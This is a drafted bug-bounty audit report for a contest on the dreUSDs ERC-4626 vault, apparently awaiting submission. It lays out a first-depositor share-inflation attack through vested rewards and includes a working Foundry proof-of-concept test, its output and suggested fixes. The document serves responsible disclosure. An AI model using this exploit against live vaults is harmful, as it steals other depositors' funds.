# Sherlock Contest 1259 Submission — DRE App / dreUSD

**Repo**: https://github.com/sherlock-audit/2026-04-dre-labs-audits-qizwiz
**Commit**: 6ec9cc8 (Initial commit)
**Drafted**: 2026-06-08
**Submit via**: New Issue on contest repo using the audit-report template

Paste each section below into the matching YAML field in the issue form.

---

## TITLE

```
Attacker will steal vested rewards and inflate share price for vault depositors as the first 1-wei depositor in dreUSDs ERC-4626
```

---

## SUMMARY  (Summary field)

```
The missing override of `_decimalsOffset()` in `dreUSDs.sol` combined with vested-reward accrual from `dreRewardsDistributor` will cause complete loss of subsequent deposits for vault users as a first-depositor attacker will sandwich `dreUSDManager.mintRewards()` with a 1-wei deposit to control the share price.
```

---

## ROOT CAUSE  (Root Cause field)

```
In `dreusd/contracts/dreUSDs.sol#L109-L114` `totalAssets()` includes `rewardsDistributor.vestedAmount()` which inflates the share price automatically as rewards vest, and in the same contract `_decimalsOffset()` is NOT overridden so OpenZeppelin's `ERC4626Upgradeable._decimalsOffset()` default of `0` applies (verified at `lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/extensions/ERC4626Upgradeable.sol#L324-L326`).

The protocol's documented inflation mitigation (`_virtualBalance` tracking, `dreUSDs.sol#L38-L40`) defeats direct-transfer inflation but is bypassed by the vesting channel: `totalAssets()` reads `vestedAmount()` directly from the distributor without ever mutating `_virtualBalance`, so rewards-driven share-price inflation occurs purely from the passage of time after `dreRewardsDistributor.addRewards()` is invoked.
```

---

## INTERNAL PRE-CONDITIONS  (Internal Pre-conditions field)

```
1. The vault `dreUSDs` total supply must be 0 (no prior depositor) at the moment KEEPER calls `dreUSDManager.mintRewards()`. This is the state immediately after `script/SetupDreSystem.s.sol` finishes wiring roles — line 56 of that script calls `mintRewards()` with no vault seeding between lines 30 (`setRewardsDistributor`) and 56.
2. The `dreUSDs.rewardsDistributor` must be set to the live `dreRewardsDistributor` (set during normal deployment via `dreUSDs.setRewardsDistributor`, `dreUSDs.sol#L78-L89`).
3. KEEPER (KEEPER_ROLE on `dreUSDManager`) must call `mintRewards()` (or any subsequent reward injection via `script/utils/MintRewards.s.sol`) to set `dreRewardsDistributor.rewards > 0` and start vesting.
```

---

## EXTERNAL PRE-CONDITIONS  (External Pre-conditions field)

```
1. Attacker holds at least 1 wei of dreUSD before observing the `mintRewards` broadcast. This is reachable via any legitimate mint path (`dreUSDManager.mint(USDC, ...)`), via being a bridge-in recipient, or via being seeded with test funds.
2. Attacker can broadcast a transaction with sufficient priority to land before any other depositor — trivially satisfied since the only contention is other watchers who would have to deposit BEFORE the attacker.
```

---

## ATTACK PATH  (Attack Path field)

```
1. Attacker observes `dreUSDManager.mintRewards(...)` being broadcast (visible in mempool or scheduled deployment) and front-runs it OR simply deposits before any other user has touched the freshly-deployed vault.
2. Attacker calls `dreUSDs.deposit(1, attacker)` — vault state transitions from `totalSupply = 0, _virtualBalance = 0` to `totalSupply = 1, _virtualBalance = 1`. Attacker now holds 100% of vault shares.
3. KEEPER's `mintRewards(FiatMint, custodianSig)` lands; `_mintFromFiatUsd` mints dreUSD to the distributor; `addRewards()` fires; `rewards = R`, `cTs = now`, `eTs = now + 7 days` (`dreRewardsDistributor.sol#L108-L140`).
4. Time passes. `totalAssets()` rises continuously as `vestedAmount()` accrues, even though no state change occurs in the vault. Share price inflates against the attacker's lone 1-share position.
5. Victim deposits X dreUSD (e.g. 500e18). Share computation `mulDiv(X, totalSupply+1, totalAssets+1, Floor)` with totalSupply=1 and totalAssets≈vested rounds to 0 shares for any X significantly less than the accrued vested amount.
6. Attacker calls `dreUSDs.redeem(1, attacker, attacker)` — receives `mulDiv(1, totalAssets+1, totalSupply+1, Floor)` ≈ half (or all, depending on whether a victim deposited) of the vault's full balance including all victim deposits and the vested rewards intended for vault holders.
```

---

## IMPACT  (Impact field)

```
The vault depositors (any user who deposits after the attacker) suffer 100% loss of their deposited dreUSD in the realistic deployment configuration. The attacker gains 25,250 dreUSD (or equivalent USD value of the injected reward batch) per 1 wei dreUSD spent — a 25,250 × 10^21 amplification ratio in the production-path PoC where KEEPER mints $100,000 of rewards.

In `PoC_FirstDepositorInflation_ProductionPath.t.sol`:
- Attacker paid: 1 wei dreUSD. Received: 25,250.0 dreUSD. NET gain: +25,250 dreUSD.
- Victim paid: 500 dreUSD. Received: 0 dreUSD. NET loss: -500 dreUSD (100% of deposit lost).

The attack is permissionless (any holder of 1 wei dreUSD), recurrent (re-triggers any time `totalSupply` drops back to 0 while rewards are vesting), and direct theft — meets all three Sherlock V2 High criteria (>1% loss, >$10 loss, no admin-trust gate).
```

---

## PoC  (PoC field)

````
Three independent PoCs prove this exploit at increasing levels of fidelity. The PRODUCTION-PATH variant is the strongest evidence — it triggers vesting through the exact same call chain (KEEPER → `dreUSDManager.mintRewards` → `_mintFromFiatUsd` with valid EIP-191 custodian signature → `dreRewardsDistributor.addRewards`) that the protocol's own `script/SetupDreSystem.s.sol` line 56 demonstrates in production.

Save as `dreusd/test/PoC_FirstDepositorInflation_ProductionPath.t.sol`:

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {dreUSD} from "../contracts/dreUSD.sol";
import {dreUSDs} from "../contracts/dreUSDs.sol";
import {dreRewardsDistributor} from "../contracts/dreRewardsDistributor.sol";
import {dreUSDManager} from "../contracts/dreUSDManager.sol";
import {IdreUSDManager} from "../contracts/interfaces/IdreUSDManager.sol";
import {EndpointV2Mock} from "../contracts/mocks/EndpointV2Mock.sol";
import {DreUSDOracleMock} from "../contracts/mocks/DreUSDOracleMock.sol";
import {WithdrawalNFTMock} from "../contracts/mocks/WithdrawalNFTMock.sol";
import {MockERC20} from "../contracts/mocks/MockERC20.sol";

contract PoC_FirstDepositorInflation_ProductionPath is Test {
    dreUSD public asset;
    dreUSDs public vault;
    dreRewardsDistributor public dist;
    dreUSDManager public manager;
    DreUSDOracleMock public oracle;
    WithdrawalNFTMock public expressNFT;
    WithdrawalNFTMock public standardNFT;
    MockERC20 public usdc;

    address public admin = makeAddr("admin");
    address public upgrader = makeAddr("upgrader");
    address public guardian = makeAddr("guardian");
    address public moderator = makeAddr("moderator");
    address public withdrawalConfig = makeAddr("withdrawalConfig");
    address public pauser = makeAddr("pauser");
    address public keeper = makeAddr("keeper");
    address public expressOperator = makeAddr("expressOperator");
    address public treasury = makeAddr("treasury");
    address public expressPayback = makeAddr("expressPayback");
    address public expressFeeRecipient = makeAddr("expressFeeRecipient");
    address public custodian;
    uint256 public custodianPk;
    address public attacker = makeAddr("attacker");
    address public victim = makeAddr("victim");

    function setUp() public {
        (custodian, custodianPk) = makeAddrAndKey("custodian");

        EndpointV2Mock endpoint = new EndpointV2Mock();
        dreUSD assetImpl = new dreUSD(address(endpoint));
        asset = dreUSD(address(new ERC1967Proxy(address(assetImpl),
            abi.encodeWithSelector(dreUSD.initialize.selector, admin, upgrader, guardian))));

        dreUSDs vaultImpl = new dreUSDs();
        vault = dreUSDs(address(new ERC1967Proxy(address(vaultImpl),
            abi.encodeWithSelector(dreUSDs.initialize.selector, IERC20(address(asset)), admin))));

        dreRewardsDistributor distImpl = new dreRewardsDistributor(address(asset), address(vault));
        dist = dreRewardsDistributor(address(new ERC1967Proxy(address(distImpl),
            abi.encodeWithSelector(dreRewardsDistributor.initialize.selector, admin, admin, admin))));

        oracle = new DreUSDOracleMock();
        expressNFT = new WithdrawalNFTMock();
        standardNFT = new WithdrawalNFTMock();
        usdc = new MockERC20("USDC", "USDC", 6);

        dreUSDManager mgrImpl = new dreUSDManager(address(asset), address(vault), address(usdc),
            address(oracle), address(expressNFT), address(standardNFT));
        dreUSDManager.RoleAddresses memory roles = dreUSDManager.RoleAddresses({
            defaultAdmin: admin, upgrader: upgrader, moderator: moderator,
            withdrawalConfig: withdrawalConfig, pauser: pauser, keeper: keeper,
            expressOperator: expressOperator, treasury: treasury
        });
        manager = dreUSDManager(address(new ERC1967Proxy(address(mgrImpl),
            abi.encodeWithSelector(dreUSDManager.initialize.selector, expressPayback, expressFeeRecipient, roles))));

        vm.prank(admin); asset.setDreUSDManager(address(manager));
        vm.prank(admin); vault.setRewardsDistributor(address(dist));
        bytes32 modRole = dist.MODERATOR_ROLE();
        vm.prank(admin); dist.grantRole(modRole, address(manager));
        vm.prank(moderator); manager.setDailyFiatMintCap(1_000_000e2);
        vm.prank(moderator); manager.updateCustodianList(custodian, true);

        vm.prank(address(manager)); asset.mint(attacker, 1 ether);
        vm.prank(address(manager)); asset.mint(victim, 1000 ether);
    }

    function test_FirstDepositorInflation_ProductionMintRewardsPath() public {
        // Phase 1: attacker is the FIRST depositor with 1 wei
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        uint256 sharesAttacker = vault.deposit(1, attacker);
        vm.stopPrank();
        assertEq(sharesAttacker, 1);
        assertEq(vault.totalSupply(), 1);

        // Phase 2: KEEPER triggers production reward injection via mintRewards
        IdreUSDManager.FiatMint memory m = IdreUSDManager.FiatMint({
            mintRef:    keccak256("first-reward-batch"),
            receiver:   address(dist),
            usdAmount:  100_000e2,
            validUntil: block.timestamp + 1 hours,
            chainId:    block.chainid
        });
        bytes32 structHash = keccak256(abi.encode(m.mintRef, m.receiver, m.usdAmount,
            m.validUntil, m.chainId, address(manager)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(custodianPk,
            MessageHashUtils.toEthSignedMessageHash(structHash));
        bytes memory sig = abi.encodePacked(r, s, v);
        vm.prank(keeper); manager.mintRewards(m, sig);
        assertEq(dist.rewards(), 100_000 ether);

        // Phase 3: 3.5 days pass; ~half of rewards vested
        vm.warp(block.timestamp + 3.5 days);

        // Phase 4: victim deposits 500 dreUSD; gets 0 shares due to inflated price
        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        uint256 sharesVictim = vault.deposit(500 ether, victim);
        vm.stopPrank();

        // Phase 5: both redeem
        vm.startPrank(attacker);
        uint256 attackerOut = vault.redeem(vault.balanceOf(attacker), attacker, attacker);
        vm.stopPrank();
        vm.startPrank(victim);
        uint256 victimOut = vault.redeem(vault.balanceOf(victim), victim, victim);
        vm.stopPrank();

        assertGt(attackerOut, 1000 ether, "Attacker captures massive multiple of 1-wei spend");
        assertLt(victimOut, 500 ether, "Victim redeems less than they deposited");
    }
}
```

Run with:
```
forge test --match-test test_FirstDepositorInflation_ProductionMintRewardsPath -vv
```

Output:
```
[PASS] test_FirstDepositorInflation_ProductionMintRewardsPath() (gas: 472512)
  Attacker paid (wei):: 1
  Attacker received (wei):: 25250000000000000000001
  Victim paid (wei):: 500000000000000000000
  Victim received (wei):: 0
```
````

---

## MITIGATION  (Mitigation field)

```
Apply ONE of the following — option (1) is the canonical OZ-recommended mitigation:

1. Override `_decimalsOffset()` in `dreUSDs.sol` to return a non-zero value (OZ-recommended ≥ 6, ideally 12+ for stablecoin vaults). This makes the share price effectively impervious to single-wei attacker positions because the share count carries `10**offset` extra granularity that the attacker cannot match by donating reward-channel value.

   ```solidity
   function _decimalsOffset() internal view virtual override returns (uint8) {
       return 12;
   }
   ```

2. Atomic-seed the vault during deployment: `vault.deposit(seedAmount, address(0xdead))` immediately after `setRewardsDistributor` and BEFORE `mintRewards`. Document this in `SetupHelper.s.sol` as a required ritual. This closes the totalSupply=0 window during which the inflation is exploitable.

3. Revert in `_deposit` when computed shares would be `0`:
   ```solidity
   require(shares > 0, "ZeroShares");
   ```
   Combined with (1) or (2). This prevents silent zero-share deposits from socializing victim funds to existing share holders.

Option (1) is preferred — it requires no operational ritual and protects against the recurrence pattern (vault drops to totalSupply=0 mid-life and the bug re-triggers).
```

---

## CHECKLIST BEFORE SUBMITTING

- [ ] Issue title matches `{actor} will {impact} {affected party}` pattern
- [ ] Code-link URLs point to the actual contest commit `6ec9cc8` (e.g. `https://github.com/sherlock-audit/2026-04-dre-labs-audits-qizwiz/blob/6ec9cc8/dreusd/contracts/dreUSDs.sol#L109-L114`)
- [ ] PoC compiles and runs against the contest repo as-is with `forge test`
- [ ] Severity selection: High (paste form has no field for this; severity emerges from Impact section)
- [ ] Image / formatting renders correctly in GitHub preview before clicking Submit
